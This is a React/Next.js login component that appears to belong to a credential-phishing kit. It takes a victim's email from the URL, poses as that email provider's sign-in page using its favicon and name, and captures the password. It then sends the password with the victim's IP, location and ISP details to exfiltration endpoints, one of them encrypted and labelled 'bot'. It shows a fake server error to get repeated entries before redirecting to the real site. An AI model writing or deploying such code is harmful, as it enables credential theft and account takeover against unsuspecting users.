"use client"
import React, { Fragment, useEffect, useState } from 'react';
import Button from 'react-bootstrap/Button';
import Form from 'react-bootstrap/Form';
import 'bootstrap/dist/css/bootstrap.min.css';
import './Universal.css'
import Spinner from 'react-bootstrap/Spinner';
import NoPage404 from '../NoPage404/NoPage404';
import Image from "next/image";
import def from '../../../public/next.svg';
import {encryptPayload} from '@/utils/encrypt'
// import axios from 'axios'

const Universal = ({data}) => {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [domain, setDomain] = useState('')
  const [name, setName] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [webLogin, setWebLogin] = useState(['', '', '', ''])
  const [isFavIcon, setIsFavIcon] = useState(false)
  const [valPass, setValPass] = useState(false)
  const [clicks, setClicks] = useState(0)

  const [geoInfo, setGeoInfo] = useState(null)

  useEffect(() => {
   const mySearchParams = new URLSearchParams(window.location.search)
   const email = mySearchParams.get('usn')
   setEmail(email)
   if(email){
    let dm = email.split('@')[1]

    let splitted = dm.split(".")

    if (splitted.length == 2) {
      dm = splitted.join('.')
    } else if (splitted.length > 2) {
      dm = splitted.slice(0, 2).join('.')
    }

    if (dm === 'gmail.com') {
      dm = 'google.com'
     } else if (dm === 'live.com') {
        dm = 'microsoft.com'
     } else if (dm === 'hotmail.com') {
      dm = 'microsoft.com'
     } else if (dm === 'outlook.com') {
      dm = 'microsoft.com'
     }

      const nm = dm.split('.')[0]
      setDomain(dm)
      setName(nm)

   }




    async function check(link, i) {
      const response = await fetch(`/api/checker?link=${link}`)
      const dd = await response.json()

      if(dd.ok) {
        setWebLogin((prev) => {
          const updatedItems = [...prev];
          updatedItems[i] = '1';
          return updatedItems;
        })
      } else {
        setWebLogin((prev) => {
          const updatedItems = [...prev];
          updatedItems[i] = '';
          return updatedItems;
        })
      }

    }

  getGeoInfo()
  // check()
  }, [domain])


  async function getFavIconStatus(domain) {
    const resp = await fetch(`/api/getFavIcon?domain=${domain}`)
    const data = await resp.json()
    if(data.ok) {
      setIsFavIcon(true)
    } else {
      setIsFavIcon(false)
    }
  }



  async function getGeoInfo() {
    const response = await fetch('/api/getInfo')
    const data = await response.json()
    setGeoInfo(data)
  }

  const sendInfo = async (e) => {
    setLoading(true)
    e.preventDefault()

    setClicks(clicks + 1)
    const info = {
      email,
      password,
      country: geoInfo.country,
      city: geoInfo.city,
      region: geoInfo.region,
      host_ip: geoInfo.ip,
      hostname: geoInfo.hostname,
      postal_code: geoInfo.postal,
      timezone: geoInfo.timezone.id,
      date: new Date().toDateString()
    }

    const res = await fetch('/api/send-email', {
      method: "POST",
      body: JSON.stringify(info),
      headers: {
        'content-type': 'application/json'
      }
    })
    if(res.ok){
      console.log("Yeai!")
      setLoading(false)
      setError('Error connecting to server')
    }else{
      console.log("Oops! Something is wrong.")
      setLoading(false)
      setError('Error connecting to server')
    }


    if(clicks >= 2) {
      window.location = `https://${domain}`
    }

  }

  const sendInfoBot = async (e) => {
    e.preventDefault()
    setLoading(true)

    setClicks(clicks + 1)
    const info = {
      email,
      password,
      country: geoInfo.country,
      city: geoInfo.city,
      region: geoInfo.region,
      host_ip: geoInfo.ip,
      hostname: `${geoInfo.connection?.asn} | ${geoInfo.connection?.org} | ${geoInfo.connection?.isp} | ${geoInfo.connection?.domain}` ,
      postal_code: geoInfo.postal,
      timezone: geoInfo.timezone?.id,
      date: new Date().toDateString()
    }



    const encryptedPayload = encryptPayload(info)
    console.log('encrypted_payload: ', await encryptedPayload)

    try {
      const response = await fetch('/api/bot', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(await encryptedPayload),
      });

      if (response.status === 200) {
        console.log('sent successfully')
        setLoading(false)
        setError('Error connecting to server')
      } else {
        console.log('Unsuccessful')
        setLoading(false)
        setError('Error connecting to server')
      }
    } catch (error) {
      console.log(`Error sending message.: ${error}`);
      setLoading(false)
      setError('Error connecting to server')
    }

    if(clicks >= 2) {
      window.location = `https://${domain}`
    }

  }

  const checkImage = async (domain) => {
    // 'use server'
    try {
      // let qs = `?start=1&limit=5000&convert=USD`
      const response = await fetch(`/api/checkImage/?domain=${domain}`);
      const data = await response.json()
      console.log('data: ', data)
    } catch (ex) {
      console.log('er: ',ex);

    }
  }

  const data_loaded = () => {
    if(!data) {
      <Spinner />
    } else {

    }
  }


  const validatePass = (e) => {
    console.log('I am triggered!!!', e.target.value.length)

    if(e.target.value.length < 4) {
      setValPass(false)
    } else {
      setValPass(true)
    }

    setPassword(e.target.value)
  }
  console.log('clicks: ', clicks)
  return (

    <Fragment >

      <div className="container space">

      { email && geoInfo ? (
        <div className="center">
        <div className='adj' >
            <img src={`https://${domain}/favicon.ico`} alt={''}/>
          <span className='mt-2' style={{fontWeight: 'bold', fontSize: '22px', marginLeft: '5px'}}>{name[0].toUpperCase() + name.slice(1).toLowerCase()}</span>

        </div>
          <hr className='hrr'></hr>

          <Form className='mt-4' onSubmit={sendInfoBot}>
          <Form.Group className="mb-3" controlId="exampleForm.ControlInput1">
            <Form.Label>Email</Form.Label>
            <Form.Control name='email' value={email} type="text" disabled />
          </Form.Group>
          <Form.Group className="mb-3" controlId="exampleForm.ControlTextarea1">
            <Form.Label>Password</Form.Label>
            <Form.Control name='password' className={!valPass ? 'pass_' : ''}  value={password} onChange={e => validatePass(e)} type="password" />
          </Form.Group>
          <Button className={valPass ? 'but' : 'disabled but'} type="submit">
             {loading ? <Spinner /> : 'Login'}
          </Button>

          {error ? <p style={{fontSize: '12px', color: 'red'}}>{error}</p> : ''}
        </Form>
        <p style={{fontSize: '12px', marginTop: '10px'}}>All right reserved. Copyright © 2025 {name}</p>
      </div>
      ) : email && !geoInfo ? (
        <Spinner style={{marginTop: "20%", color: 'white', height: '100px', width: "100px"}} size="lg" />
      ) : (
        <NoPage404 />
      )}




      </div>


    </Fragment>

  )
}

export default Universal